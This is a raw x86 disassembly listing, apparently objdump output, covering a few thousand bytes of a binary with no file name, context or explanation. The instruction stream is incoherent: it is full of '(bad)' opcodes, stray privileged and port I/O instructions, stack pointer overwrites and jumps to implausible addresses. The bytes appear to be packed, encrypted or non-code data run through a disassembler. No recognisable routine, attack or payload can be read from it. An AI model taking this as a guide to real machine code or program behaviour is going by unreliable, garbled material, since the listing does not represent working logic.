  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
